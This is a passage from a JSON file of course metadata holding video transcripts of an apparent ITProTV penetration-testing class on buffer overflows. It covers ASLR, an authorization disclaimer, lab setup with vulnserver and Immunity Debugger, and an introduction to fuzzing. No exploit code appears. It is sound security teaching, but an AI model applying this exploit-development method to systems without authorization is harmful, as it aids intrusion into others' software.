are.\n\n310\n00:14:45.700 --> 00:14:47.360\nAnd they're in the same spot every time.\n\n311\n00:14:47.360 --> 00:14:48.682\nUse that to my advantage.\n\n312\n00:14:48.682 --> 00:14:53.000\nWhat ASLR does is says, we're not gonna\nput them in the same spot every time.\n\n313\n00:14:53.000 --> 00:14:55.820\nWe're gonna just continually\nshift the board around.\n\n314\n00:14:55.820 --> 00:14:58.280\nAnd every time we load this up\nit's gonna go over here and\n\n315\n00:14:58.280 --> 00:15:00.700\nmaybe it was here last time but\nit's going over here now.\n\n316\n00:15:00.700 --> 00:15:02.480\nSo these protections might be in place and\n\n317\n00:15:02.480 --> 00:15:07.630\nthese will stop you from successfully\nexploiting a buffer overflow.\n\n318\n00:15:07.630 --> 00:15:11.290\nOkay, let's talk about methodology.\n\n319\n00:15:11.290 --> 00:15:14.236\nHow do we start our buffer overflow?\n\n320\n00:15:14.236 --> 00:15:19.900\nWhat's the A to B or\nA to Z make a buffer overflow work.\n\n321\n00:15:19.900 --> 00:15:21.140\nAnd this is an important part.\n\n322\n00:15:21.140 --> 00:15:23.200\nYou have to have a set method.\n\n323\n00:15:23.200 --> 00:15:27.400\nAnd it is tricky,\nit is twisty, take good notes.\n\n324\n00:15:27.400 --> 00:15:30.900\nBecause you could follow me along,\ntype exactly what I type and\n\n325\n00:15:30.900 --> 00:15:32.550\nyou'll probably get it work.\n\n326\n00:15:32.550 --> 00:15:34.960\nBut then you'll go to do it yourself,\n\n327\n00:15:34.960 --> 00:15:38.540\ntry to recreate that and\nyou're like aw, why did I write this?\n\n328\n00:15:38.540 --> 00:15:40.035\nI don't understand what I'm doing here.\n\n329\n00:15:40.035 --> 00:15:41.788\n&gt;&gt; [LAUGH]\n&gt;&gt; Trust me, been there.\n\n330\n00:15:41.788 --> 00:15:44.350\n&gt;&gt; I was gonna say, sounds like\nyou're speaking from experience.\n\n331\n00:15:44.350 --> 00:15:45.840\n&gt;&gt; Yeah,\nyeah I don't know anything about it.\n\n332\n00:15:45.840 --> 00:15:47.980\nEvery time I've done this it\nworked perfectly, ever time.\n\n333\n00:15:47.980 --> 00:15:49.088\nNever have an issue.\n\n334\n00:15:49.088 --> 00:15:51.349\nRemember we're working with code.\n\n335\n00:15:51.349 --> 00:15:56.479\nWe're working with assembly language even,\nso.\n\n336\n00:15:56.479 --> 00:15:59.707\nBe prepared for some things to\nreally twist your mind around.\n\n337\n00:15:59.707 --> 00:16:02.410\nEspecially the way they do things.\n\n338\n00:16:02.410 --> 00:16:03.888\nI'll just throw this out here.\n\n339\n00:16:03.888 --> 00:16:06.935\nLittle Indian, love it,\nit's a fantastic thing.\n\n340\n00:16:06.935 --> 00:16:08.687\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't know why it's that way, but\n\n341\n00:16:08.687 --> 00:16:11.740\nit sure is a thing, and you're gonna\nlearn about it here in just a few.\n\n342\n00:16:11.740 --> 00:16:14.492\nSo keep that in mind,\nsome weird stuff that's going on.\n\n343\n00:16:14.492 --> 00:16:18.790\nAll right, so first thing you need\nto do is create a test environment.\n\n344\n00:16:18.790 --> 00:16:22.563\nYes, as pen testers we\nneed test environments.\n\n345\n00:16:22.563 --> 00:16:26.422\nBecause people aren't gonna just go hey,\nyeah, hack away at my system until you\n\n346\n00:16:26.422 --> 00:16:29.320\nfigure out how to break it and\nthen we're here for you.\n\n347\n00:16:29.320 --> 00:16:30.511\nThat's not gonna occur.\n\n348\n00:16:30.511 --> 00:16:32.294\n&gt;&gt; Or as a bad guy, as an attacker,\n\n349\n00:16:32.294 --> 00:16:36.264\nyou wanna protect your method before\nyou actually launch your attack.\n\n350\n00:16:36.264 --> 00:16:40.010\nAnd that set off all the alarms as\nyou're figuring out what to do.\n\n351\n00:16:40.010 --> 00:16:43.490\n&gt;&gt; Yeah, you start throwing exploit\ncode at random at people's machines.\n\n352\n00:16:43.490 --> 00:16:46.624\nIf any kind of IDS, IPS is involved,\nthey might pick that up and\n\n353\n00:16:46.624 --> 00:16:49.123\nthen you get to wear a shiny\nnew pair of bracelets.\n\n354\n00:16:49.123 --> 00:16:53.082\n&gt;&gt; [LAUGH]\n&gt;&gt; And stay a night in the county hotel or\n\n355\n00:16:53.082 --> 00:16:54.649\nmaybe a few nights.\n\n356\n00:16:54.649 --> 00:16:57.088\nSo, and a good spot for\nus to put our disclaimer.\n\n357\n00:16:57.088 --> 00:17:02.560\nDo not do these things on machines that\nyou do not have authorization to or own.\n\n358\n00:17:02.560 --> 00:17:03.670\nRight?\nSo this is not for\n\n359\n00:17:03.670 --> 00:17:06.610\nyou to just make the Internet\nyour play thing.\n\n360\n00:17:06.610 --> 00:17:12.029\nThis is for ethical people to do ethical\nthings, to find problems in code so\n\n361\n00:17:12.029 --> 00:17:17.462\nthat you can help them fix it, not\nexploit it to your fun and profit, okay?\n\n362\n00:17:17.462 --> 00:17:19.674\nDisclaimer over, there it is,\na random aside for,\n\n363\n00:17:19.674 --> 00:17:22.200\nyou do not do bad things with\nwhat we're teaching you to do.\n\n364\n00:17:22.200 --> 00:17:23.362\n&gt;&gt; All right, now let's have some fun.\n\n365\n00:17:23.362 --> 00:17:24.520\n&gt;&gt; Yeah, let's have some fun.\n\n366\n00:17:24.520 --> 00:17:27.170\nSo let's talk about creating\nthe test environment.\n\n367\n00:17:27.170 --> 00:17:31.511\nThis is, this program specifically runs on\nWindows so I need a Windows environment.\n\n368\n00:17:31.511 --> 00:17:35.680\nI will now sit here and wait until you\ninstall Windows VM or a Windows machine.\n\n369\n00:17:35.680 --> 00:17:36.566\nAnd, [LAUGH] no i won't wait.\n\n370\n00:17:36.566 --> 00:17:39.953\nAnd now that that's done, right?\n\n371\n00:17:39.953 --> 00:17:40.517\n[LAUGH] That's right.\n\n372\n00:17:40.517 --> 00:17:41.620\n&gt;&gt; Go and grab the vulnserver.\n\n373\n00:17:41.620 --> 00:17:44.820\nRight, you need a copy of whatever\nit is that you're testing.\n\n374\n00:17:44.820 --> 00:17:48.580\nThis is an FTP server, so\nit's a VSFTP on Linux.\n\n375\n00:17:48.580 --> 00:17:53.784\nInstall the same Linux environment\nwith the same copy of VSFTP and\n\n376\n00:17:53.784 --> 00:17:55.401\nput that together.\n\n377\n00:17:55.401 --> 00:17:58.770\nYou can't mix and match these things and\ngo, this is gonna work.\n\n378\n00:17:58.770 --> 00:18:01.960\n&gt;&gt; Yeah, this just goes back to\nour scanning and enumeration.\n\n379\n00:18:01.960 --> 00:18:04.884\nWhen we're doing not just port\nscanning to see what ports are open.\n\n380\n00:18:04.884 --> 00:18:07.090\nBut we're also doing the banner-grabbing.\n\n381\n00:18:07.090 --> 00:18:09.726\nI need to know what version\nof Apache they're running,\n\n382\n00:18:09.726 --> 00:18:12.370\nwhat version of Perl they're\nimplementing with that.\n\n383\n00:18:12.370 --> 00:18:16.012\nBecause I need to set up a duplicate\nenvironment down to the version and\n\n384\n00:18:16.012 --> 00:18:16.764\npatch level.\n\n385\n00:18:16.764 --> 00:18:19.620\nSo that I can verify that\nwhat I'm doing is gonna work.\n\n386\n00:18:19.620 --> 00:18:23.660\n&gt;&gt; That's exactly right, and Mike is\nnailing right on the head, yet again,\n\n387\n00:18:23.660 --> 00:18:27.469\ncuz he's a fan, he knows this stuff\n&gt;&gt; He's not just a pretty face standing\n\n388\n00:18:27.469 --> 00:18:29.832\nnext to me,\nhe's a smart man he knows his security.\n\n389\n00:18:29.832 --> 00:18:32.741\nYou need down to that version and\npatch number,\n\n390\n00:18:32.741 --> 00:18:36.170\nbecause those are different\nprograms from each other.\n\n391\n00:18:36.170 --> 00:18:38.910\nEven though it's the same program per se,\nif the patch number is\n\n392\n00:18:38.910 --> 00:18:42.333\ndifferent you're going to get different\nresults, it may work it may not work.\n\n393\n00:18:42.333 --> 00:18:45.865\nSo you have to be consistent\nin that test environment.\n\n394\n00:18:45.865 --> 00:18:49.794\nIf you have a client who say we'd\nlike you to pen test our systems,\n\n395\n00:18:49.794 --> 00:18:52.869\nWell you need pass numbers,\nversion numbers, and\n\n396\n00:18:52.869 --> 00:18:56.580\nmake a model of everything\nthat they want you to test.\n\n397\n00:18:56.580 --> 00:18:57.920\nBuild your sandboxes.\n\n398\n00:18:57.920 --> 00:19:00.940\nKeep them off the internet,\ncuz obviously they might be vulnerable.\n\n399\n00:19:00.940 --> 00:19:02.470\nYou've got to find that out.\n\n400\n00:19:02.470 --> 00:19:03.421\nSo just keep that in mind.\n\n401\n00:19:03.421 --> 00:19:06.133\nSo build that test and like I said,\nwe'll sit here and wait for\n\n402\n00:19:06.133 --> 00:19:07.870\nyou until you're done.\n\n403\n00:19:07.870 --> 00:19:10.108\nNow that's done we will move on.\n\n404\n00:19:10.108 --> 00:19:11.354\nWhat else do we need to know.\n\n405\n00:19:11.354 --> 00:19:12.670\nYou need a debugger.\n\n406\n00:19:12.670 --> 00:19:16.140\nIt's kind of this is a important\npiece of this puzzle and\n\n407\n00:19:16.140 --> 00:19:17.870\nsomething that you will need to learn.\n\n408\n00:19:17.870 --> 00:19:21.161\nAnd the learning curve\n[NOISE] is a little steep,\n\n409\n00:19:21.161 --> 00:19:24.670\njust throwing it out there,\nbeing honest with my viewers.\n\n410\n00:19:24.670 --> 00:19:29.281\nI don't want them to think, man I'm just\ngonna grab this debugger an go to town.\n\n411\n00:19:29.281 --> 00:19:34.091\nMan I've been frustrated learning the\ndebugger, so get your documentation ready,\n\n412\n00:19:34.091 --> 00:19:35.911\nyou're gonna have questions.\n\n413\n00:19:35.911 --> 00:19:37.330\nYou need to learn your debugger.\n\n414\n00:19:37.330 --> 00:19:40.690\nI recommend Immunity because I like it,\nbecause I've used it,\n\n415\n00:19:40.690 --> 00:19:41.960\nand that's what I know.\n\n416\n00:19:41.960 --> 00:19:44.039\nThere are other really\ngood debuggers out there.\n\n417\n00:19:44.039 --> 00:19:45.904\nOllyDbg, I think is another one.\n\n418\n00:19:45.904 --> 00:19:50.314\nI've actually used that before\nto do security stuff to it,\n\n419\n00:19:50.314 --> 00:19:52.885\nI'll say, to do security stuff.\n\n420\n00:19:52.885 --> 00:19:56.999\nBut when I found Immunity,\nI liked Immunity better for my purposes.\n\n421\n00:19:56.999 --> 00:20:00.710\nSo if you like OllyDbg,\ngreat, great program.\n\n422\n00:20:00.710 --> 00:20:02.810\nBut Immunity is fantastic.\n\n423\n00:20:02.810 --> 00:20:06.176\nLet me just show you a look at their\nwebsite so you can see how to get there.\n\n424\n00:20:06.176 --> 00:20:08.921\nLet me jump over here, grab a browser.\n\n425\n00:20:08.921 --> 00:20:16.490\nAnd I'm just gonna Google search Immunity\ndebugger for Windows, there we go.\n\n426\n00:20:16.490 --> 00:20:18.915\nSo you can see I've looked this up\nbefore so I can show you good people.\n\n427\n00:20:18.915 --> 00:20:22.263\nAnd there's their website, looks,\nit's got a really nice website.\n\n428\n00:20:22.263 --> 00:20:23.896\nThese people are really\ndeep into security stuff.\n\n429\n00:20:23.896 --> 00:20:27.042\nThey help pen testers a lot,\ntheir products are phenomenal.\n\n430\n00:20:27.042 --> 00:20:31.440\nThis is no exception, and there it is\nright on the first page right there.\n\n431\n00:20:31.440 --> 00:20:35.660\nIf you didn't land on this page,\nyou just go to products and\n\n432\n00:20:35.660 --> 00:20:38.320\nif I can that, there it is.\n\n433\n00:20:38.320 --> 00:20:40.988\nI'm in the debugger that\nshould take you here.\n\n434\n00:20:40.988 --> 00:20:43.927\nAnd when you do,\ngo down just to here and there you go.\n\n435\n00:20:43.927 --> 00:20:49.410\nYou'll have to fill out some information,\nso you know, as companies like to do.\n\n436\n00:20:50.420 --> 00:20:53.190\nSee who's interested in their product so\njust fill that out.\n\n437\n00:20:53.190 --> 00:20:55.502\nThen you hit your download button and\nyou get Immunity debugger.\n\n438\n00:20:55.502 --> 00:20:58.035\nIt installs like any other\nWindows 32 application.\n\n439\n00:20:58.035 --> 00:21:00.659\nYou guys know how to do that if\nyou're sitting in this class.\n\n440\n00:21:00.659 --> 00:21:01.988\nLike I said, assume knowledge.\n\n441\n00:21:01.988 --> 00:21:03.833\n&gt;&gt; [LAUGH]\n&gt;&gt; That you know how to install\n\n442\n00:21:03.833 --> 00:21:04.642\na program in Windows.\n\n443\n00:21:04.642 --> 00:21:07.389\n&gt;&gt; [LAUGH]\n&gt;&gt; Now once that's done obviously,\n\n444\n00:21:07.389 --> 00:21:10.480\nyou get to your package,\nit is install, I'll close that.\n\n445\n00:21:10.480 --> 00:21:15.548\nGo over to my Windows, let me close\nthis down, Ctrl+C, and get out of this.\n\n446\n00:21:15.548 --> 00:21:19.443\nThere is my Immunity Debugger right there.\n\n447\n00:21:19.443 --> 00:21:23.380\nSo, to get this to work to\nmake all things happy, and\n\n448\n00:21:23.380 --> 00:21:28.314\nmove it the way we need it to go\nwith our class or our sessions here.\n\n449\n00:21:28.314 --> 00:21:32.860\nOur episodes,\nactually I am going to start vulnserver.\n\n450\n00:21:32.860 --> 00:21:34.530\nI'm gonna run it as administrators.\n\n451\n00:21:34.530 --> 00:21:39.332\nCuz I like to keep it nice and give me,\nrip privileges once we exploit this thing.\n\n452\n00:21:39.332 --> 00:21:41.091\nAnd maybe I'm just a bad admin,\nand that's what I do.\n\n453\n00:21:41.091 --> 00:21:42.963\n&gt;&gt; [LAUGH]\n&gt;&gt; You know what I mean?\n\n454\n00:21:42.963 --> 00:21:44.582\nThat's what we're hoping for, absolutely.\n\n455\n00:21:44.582 --> 00:21:48.560\nI'm gonna run Immunity as an administrator\nas well, because we want full access.\n\n456\n00:21:48.560 --> 00:21:51.769\nRemember we are going down to\nmachine level stuff here so just,\n\n457\n00:21:51.769 --> 00:21:53.837\nI typically run as administrator here.\n\n458\n00:21:53.837 --> 00:21:55.958\nAnd there is our interface.\n\n459\n00:21:57.941 --> 00:22:01.128\nGot a lot buttons at the top,\nit looks cool.\n\n460\n00:22:01.128 --> 00:22:04.770\nWe've got this 4 squares\nI'm gonna show you a trick.\n\n461\n00:22:04.770 --> 00:22:07.410\nYou'll notice that\nthere's an x right here.\n\n462\n00:22:07.410 --> 00:22:09.390\nThis is something this\nis my helpful tip for\n\n463\n00:22:09.390 --> 00:22:12.970\ntoday with using Immunity\nthat drives me wild.\n\n464\n00:22:12.970 --> 00:22:15.439\nThere's an x here and this does this.\n\n465\n00:22:16.500 --> 00:22:17.128\nWhat's going on here?\n\n466\n00:22:17.128 --> 00:22:18.370\nI don't want this screen.\n\n467\n00:22:18.370 --> 00:22:20.111\nI don't need this screen for\nwhat I'm gonna show you.\n\n468\n00:22:20.111 --> 00:22:22.683\nI hit that x all the time,\nbecause it's right here next to the red x.\n\n469\n00:22:22.683 --> 00:22:25.232\n&gt;&gt; [LAUGH]\n&gt;&gt; Which when I want to close Immunity,\n\n470\n00:22:25.232 --> 00:22:26.164\nwhich I'll do a lot of.\n\n471\n00:22:26.164 --> 00:22:28.360\nWe're doing a lot of repetitive steps.\n\n472\n00:22:29.905 --> 00:22:31.015\nI tend to hit that.\n\n473\n00:22:31.015 --> 00:22:34.157\nTo get that screen back,\nlet me show you how to do that real quick.\n\n474\n00:22:34.157 --> 00:22:36.435\nYou run over here to-\n&gt;&gt; Let's not click the x again.\n\n475\n00:22:36.435 --> 00:22:38.754\n&gt;&gt; Yeah, let's not click,\nI mean you can, that's fine.\n\n476\n00:22:38.754 --> 00:22:40.757\nThere's other screens here,\nobviously, other screens.\n\n477\n00:22:40.757 --> 00:22:44.150\nThis is it with no\nmodules open whatsoever.\n\n478\n00:22:44.150 --> 00:22:49.787\nBut if you go over to View,\nyeah, View and hit CPU.\n\n479\n00:22:49.787 --> 00:22:52.557\nAnd then full screen it like this.\n\n480\n00:22:52.557 --> 00:22:54.012\nThere's our four screens back.\n\n481\n00:22:54.012 --> 00:22:59.580\nSo if accidentally hit that x as I\nvery well may do in this series.\n\n482\n00:22:59.580 --> 00:23:02.284\nNow you know how to get that back,\nthat's important.\n\n483\n00:23:02.284 --> 00:23:06.173\nBut to attach a program to it,\nour program, our vulnserver is running.\n\n484\n00:23:06.173 --> 00:23:11.880\nAll I have to do is go over to File,\nthis is the way I do it.\n\n485\n00:23:11.880 --> 00:23:17.856\nClick attach, and then you have a list of\nprograms that are running on the machine.\n\n486\n00:23:17.856 --> 00:23:22.410\nI like to sort it by name cuz I know v is\nnear the end, and then just scroll down.\n\n487\n00:23:22.410 --> 00:23:25.577\nAnd there it is vulnserver,\nthere, right there.\n\n488\n00:23:25.577 --> 00:23:29.723\nI can't really actually click on it,\nand then click attach.\n\n489\n00:23:29.723 --> 00:23:33.539\nNow the program is loaded\ninto the immunity debugger.\n\n490\n00:23:33.539 --> 00:23:35.742\nWe are seeing a lot of\nactivity at this point.\n\n491\n00:23:35.742 --> 00:23:41.394\nYou'll notice over here,\nall these things like NOP or where are we,\n\n492\n00:23:41.394 --> 00:23:48.540\nRETN, push, move, or, JE, these are all\nassembly language instructions.\n\n493\n00:23:48.540 --> 00:23:53.326\nSo the lowest language before you get\ninto binary, there's assembly, and\n\n494\n00:23:53.326 --> 00:23:56.707\nthis is what it's showing you,\nthere's assembly.\n\n495\n00:23:56.707 --> 00:24:00.522\nIt's basically taking the C Code\nthat the program is created from and\n\n496\n00:24:00.522 --> 00:24:03.700\nbreaking it down into assembly so\nthat you can see those.\n\n497\n00:24:03.700 --> 00:24:06.030\nBecause that's what we want to work with.\n\n498\n00:24:06.030 --> 00:24:07.840\nAnd over here we see\na couple other things.\n\n499\n00:24:07.840 --> 00:24:10.860\nThe register's a very important\npart of this procedure.\n\n500\n00:24:10.860 --> 00:24:12.724\nWe're gonna deal a lot over here,\n\n501\n00:24:12.724 --> 00:24:15.433\nwe're also gonna deal a lot\nover here in the dump.\n\n502\n00:24:15.433 --> 00:24:19.736\nSo if we wanna see what's in a register,\nwe send it to the dump.\n\n503\n00:24:19.736 --> 00:24:24.586\nWe can see what's going on there\nwith a little more microscopic view.\n\n504\n00:24:24.586 --> 00:24:28.900\nSo, you'll also notice something\ndown here, is that it is paused.\n\n505\n00:24:28.900 --> 00:24:30.891\nOnce you attach, yeah,\nthank you very much.\n\n506\n00:24:30.891 --> 00:24:32.719\nRight there,\ndown at the bottom right-hand corner.\n\n507\n00:24:32.719 --> 00:24:34.990\nThis is a paused system.\n\n508\n00:24:34.990 --> 00:24:37.538\nSo what it does is when you\nload a program into Immunity,\n\n509\n00:24:37.538 --> 00:24:41.024\nthe first thing it's gonna do is load\nit up and it's gonna pause the system.\n\n510\n00:24:41.024 --> 00:24:44.520\nIt's gonna say here it is,\ndoes everything look good to you?\n\n511\n00:24:44.520 --> 00:24:45.233\nDo you want to do anything?\n\n512\n00:24:45.233 --> 00:24:49.800\nAnd if you're good, if you're good to go,\nyou come over to here.\n\n513\n00:24:49.800 --> 00:24:50.750\nYou got a nice little play button.\n\n514\n00:24:50.750 --> 00:24:51.680\nAnd it should play.\n\n515\n00:24:51.680 --> 00:24:55.220\nAnd now if you look back at the bottom\nright-hand corner it says running.\n\n516\n00:24:55.220 --> 00:24:59.062\nSo now our our actual vulnserver\nis now running again.\n\n517\n00:24:59.062 --> 00:25:03.388\nIt just paused for a moment cuz\nimmunity kind of took control of it so\n\n518\n00:25:03.388 --> 00:25:04.790\nthat it could see it.\n\n519\n00:25:04.790 --> 00:25:06.110\nIt could do stuff with it.\n\n520\n00:25:06.110 --> 00:25:08.550\nAnd now that you say that yes,\nthat is happening.\n\n521\n00:25:08.550 --> 00:25:10.830\nYou've given it the green light,\nyou can hit play.\n\n522\n00:25:10.830 --> 00:25:13.453\nOnce it plays, you're, it just runs,\n\n523\n00:25:13.453 --> 00:25:17.861\nand now vulnserver is running normally for\nanybody on the outside.\n\n524\n00:25:17.861 --> 00:25:19.769\n&gt;&gt; All right, fantastic Daniel.\n\n525\n00:25:19.769 --> 00:25:21.667\nI know we've got a lot more to go, but\n\n526\n00:25:21.667 --> 00:25:25.670\nI think we might be at a good breaking\npoint here for this particular episode.\n\n527\n00:25:25.670 --> 00:25:27.054\nSo we've got our environment set up.\n\n528\n00:25:27.054 --> 00:25:28.276\nYou know, he showed us,\n\n529\n00:25:28.276 --> 00:25:31.670\nDaniel took time to show us what\na buffer overflow would end up doing.\n\n530\n00:25:31.670 --> 00:25:34.989\nWhat our end goal was,\nThe Tarantino move there, start to get.\n\n531\n00:25:34.989 --> 00:25:36.835\n&gt;&gt; [LAUGHS]\n&gt;&gt; Come back to the beginning,\n\n532\n00:25:36.835 --> 00:25:39.900\nwe've defined what a buffer overflow is.\n\n533\n00:25:39.900 --> 00:25:43.923\nAnd now we've set up our environment to\nwhere we can start taking an application,\n\n534\n00:25:43.923 --> 00:25:46.735\nlooking to see if it's\nvulnerable to a buffer overflow.\n\n535\n00:25:46.735 --> 00:25:49.883\nI know there's a couple more things\nwe're going to do in the setup as well.\n\n536\n00:25:49.883 --> 00:25:53.722\nBut, like I said, we're out of time for\nthis one, so that means we're gonna\n\n537\n00:25:53.722 --> 00:25:57.700\nleave you hanging on the edge of your\nseat, dying to know what Daniel does next.\n\n538\n00:25:57.700 --> 00:26:01.141\nWhich means you're gonna come back and\nwatch the next part, right?\n\n539\n00:26:01.141 --> 00:26:02.386\nHopefully.\n\n540\n00:26:02.386 --> 00:26:03.302\n&gt;&gt; That's the plan.\n\n541\n00:26:03.302 --> 00:26:04.291\n&gt;&gt; All right.\n\n542\n00:26:04.291 --> 00:26:05.984\nWell ladies and gentlemen,\nthat's gonna do it for this one.\n\n543\n00:26:05.984 --> 00:26:09.401\nWe hope you enjoyed watching, signing\noff for ITProTV, I've been your host,\n\n544\n00:26:09.401 --> 00:26:10.150\nMike Rodrick.\n\n545\n00:26:10.150 --> 00:26:11.887\n&gt;&gt; And I'm Daniel Lowrie.\n&gt;&gt; And we'll see you next time.\n\n546\n00:26:11.887 --> 00:26:19.002\n[MUSIC]\n\n547\n00:26:19.002 --> 00:26:21.652\nThank you for watching ITProTV.\n\n",
          "vimeoId": "202064659"
        },
        {
          "description": "In this episode, Dan and Mike continue to look at buffer overflow attacks. They demonstrate using a debugger to fuzz a program and to determine if a buffer overflow attack is possible.",
          "length": "1689",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-2-buffer_overflows_pt2-013117-PGM.00_27_55_10.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-2-buffer_overflows_pt2-013117-PGM.00_27_55_10.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-4-1-2-buffer_overflows_pt2-013117-PGM.00_27_55_10.Still001-sm.jpg",
          "title": "Buffer Overflows Part 2",
          "transcript": "WEBVTT\n\n1\n00:00:00.092 --> 00:00:01.052\nWelcome to ITProTV.\n\n2\n00:00:01.052 --> 00:00:01.963\nI'm your host Don Pezet.\n\n3\n00:00:01.963 --> 00:00:09.140\n[CROSSTALK]\n&gt;&gt; You're watching ITProTV.\n\n4\n00:00:12.530 --> 00:00:14.750\n&gt;&gt; Hello.\nWelcome to another exciting episode here\n\n5\n00:00:14.750 --> 00:00:15.299\nat ITProTV.\n\n6\n00:00:15.299 --> 00:00:19.660\nI'm your host Mike Rodrick and\ntoday we're doing penetration testing.\n\n7\n00:00:19.660 --> 00:00:20.530\nAnd in this episode,\n\n8\n00:00:20.530 --> 00:00:25.110\nwe're going to be continuing our thought\nprocess working with buffer overflows.\n\n9\n00:00:25.110 --> 00:00:29.430\nIn the previous episode, we learned\nabout what a buffer overflow is and\n\n10\n00:00:29.430 --> 00:00:32.466\nwe saw the end result of\na buffer overflow attack.\n\n11\n00:00:32.466 --> 00:00:36.060\nAnd now we're getting into\nhow to accomplish that.\n\n12\n00:00:36.060 --> 00:00:39.650\nAgain, at the very end of that last\nepisode, we got our environment set up, so\n\n13\n00:00:39.650 --> 00:00:41.470\nwe would have an area to work with.\n\n14\n00:00:41.470 --> 00:00:46.210\nAnd try to create our own buffer overflow\nand so that's what we're gonna pick us up.\n\n15\n00:00:46.210 --> 00:00:48.620\nSo if you miss that last one,\nmake sure you go back and watch that one.\n\n16\n00:00:48.620 --> 00:00:50.790\nIt will give you some good set up for\nthis episode.\n\n17\n00:00:50.790 --> 00:00:51.910\nAnd enough for me talking.\n\n18\n00:00:51.910 --> 00:00:56.135\nLet's dive back into it and I'll pass\nthe mic over to the Security guru, Mr.\n\n19\n00:00:56.135 --> 00:00:57.047\nDaniel Lowrie.\n\n20\n00:00:57.047 --> 00:00:58.310\nHow are you doing, Daniel?\n\n21\n00:00:58.310 --> 00:01:00.010\n&gt;&gt; Michael, thank you for having me back.\n\n22\n00:01:00.010 --> 00:01:02.820\nObviously we left you guys with\na cliffhanger a little bit.\n\n23\n00:01:02.820 --> 00:01:05.440\nWell, we're probably going to leave\nyou with another cliffhanger, so\n\n24\n00:01:05.440 --> 00:01:06.150\njust be prepared.\n\n25\n00:01:06.150 --> 00:01:10.580\nThis is a lot of information and like Mike\nsaid, if you didn't watch that previous\n\n26\n00:01:10.580 --> 00:01:14.400\nepisode, it's kind of necessary because\nwe're building that foundation, right?\n\n27\n00:01:14.400 --> 00:01:16.650\nYou've got to be with us where we're at or\n\n28\n00:01:16.650 --> 00:01:20.180\nat least know how to get where we're\nat before we can move forward.\n\n29\n00:01:20.180 --> 00:01:23.020\nSo that being said, we are moving\nback into buffer overflows, remember,\n\n30\n00:01:23.020 --> 00:01:27.160\nwe talked about what they were,\nhow they work and why they occur and\n\n31\n00:01:27.160 --> 00:01:28.730\nnow we're trying to make them happen.\n\n32\n00:01:28.730 --> 00:01:31.130\nNow we've set up our test environment,\n\n33\n00:01:31.130 --> 00:01:35.770\nwe've loaded our vulnerable server\nservice into our debugging machine.\n\n34\n00:01:35.770 --> 00:01:42.250\nSo that we can see certain pieces\nof instruction that's happening\n\n35\n00:01:42.250 --> 00:01:47.530\ninside of that and now we're moving on to\nthe next phase which is called fuzzing.\n\n36\n00:01:47.530 --> 00:01:50.660\n[LAUGH] I actually love\nthe term like fuzzing.\n\n37\n00:01:50.660 --> 00:01:51.530\n&gt;&gt; I like saying it.\n\n38\n00:01:51.530 --> 00:01:53.338\nSay it with us everybody out there.\n\n39\n00:01:53.338 --> 00:01:54.393\n&gt;&gt; Yeah.\n&gt;&gt; Fuzzing.\n\n40\n00:01:54.393 --> 00:01:55.240\n&gt;&gt; Fuzzing, right?\n\n41\n00:01:55.240 --> 00:01:55.910\nLot of fun, right?\n\n42\n00:01:55.910 --> 00:01:57.070\nSay fuzzing.\n\n43\n00:01:57.070 --> 00:01:57.980\nWhat is fuzzing?\n\n44\n00:01:57.980 --> 00:02:04.120\nFuzzing is basically trying to\nfigure out where the problem lies.\n\n45\n00:02:04.120 --> 00:02:07.120\nI guess that's a good way to say it.\n\n46\n00:02:07.120 --> 00:02:10.390\nSo you got a service,\nit takes input from you.\n\n47\n00:02:10.390 --> 00:02:11.560\nI wanna see whether or\n\n48\n00:02:11.560 --> 00:02:16.770\nnot that service is vulnerable to\na buffer overflow and implement fuzzing.\n\n49\n00:02:16.770 --> 00:02:17.970\nHow's that work?\n\n50\n00:02:17.970 --> 00:02:23.200\nI'm going to send a data until what I'm\nlooking for is the program to crash.\n\n51\n00:02:23.200 --> 00:02:26.632\nI want the program to crash,\nbecause if the program crashes,\n\n52\n00:02:26.632 --> 00:02:30.602\nthen at least I'm on the right track\ntoward a buffer overflow, right.\n\n53\n00:02:30.602 --> 00:02:37.770\nCuz that means that service had no idea\nwhat to do with the data I sent it.\n\n54\n00:02:37.770 --> 00:02:41.210\nNow that could be a lot of data,\nto be honest with you.\n\n55\n00:02:41.210 --> 00:02:45.100\nAnd fuzzing is a technique that helps\nus figure out how much data that is.\n\n56\n00:02:45.100 --> 00:02:48.800\nSo we have to, because if we\ndon't know how much data that is,\n\n57\n00:02:48.800 --> 00:02:49.880\nwe won't cause the crash.\n\n58\n00:02:51.520 --> 00:02:55.900\nIf it just never crashes or maybe we\nfigure out that it just doesn't crash.\n\n59\n00:02:55.900 --> 00:02:56.870\nWe can't get it to crash.\n\n60\n00:02:56.870 --> 00:03:01.070\nWe've fuzzed it to the nth degree and\nit just handles everything and\n\n61\n00:03:01.070 --> 00:03:03.890\nthe kitchen sink that we throw at it and\nwe're not getting anywhere.\n\n62\n00:03:03.890 --> 00:03:06.860\nFuzzing is the technique that\nfigures that's things out for us.\n\n63\n00:03:06.860 --> 00:03:10.170\nNow the cool thing is is that\nyou can download fuzzers.\n\n64\n00:03:10.170 --> 00:03:14.500\nThere are some third-party fuzzers\nready and able to do this work for\n\n65\n00:03:14.500 --> 00:03:17.480\nyou, but I'm going to show\nyou how to write a fuzzer.\n\n66\n00:03:17.480 --> 00:03:18.120\n&gt;&gt; Of course, you are.\n\n67\n00:03:18.120 --> 00:03:19.500\n&gt;&gt; Yes.\n&gt;&gt; [LAUGH]\n\n68\n00:03:19.500 --> 00:03:20.820\n&gt;&gt; Doesn't that sound fun?\n\n69\n00:03:20.820 --> 00:03:23.210\n&gt;&gt; It does.\n&gt;&gt; We're gonna write some code.\n\n70\n00:03:23.210 --> 00:03:26.620\nWe'll do our disclaimers for\nthe day, right?\n\n71\n00:03:26.620 --> 00:03:31.340\nSome assumed knowledge here that\nyou have the wherewithal to create\n\n72\n00:03:31.340 --> 00:03:32.560\na script of some sort.\n\n73\n00:03:32.560 --> 00:03:40.360\nThat you have at least some experience\nwith programming to some degree.\n\n74\n00:03:40.360 --> 00:03:43.460\nMaybe just to the part\nwhere you can read code and\n\n75\n00:03:43.460 --> 00:03:45.720\nmaybe not give you every little\ndetail of what's going on.\n\n76\n00:03:45.720 --> 00:03:49.030\nBut basically you get\nthe gist of what's happening,\n\n77\n00:03:49.030 --> 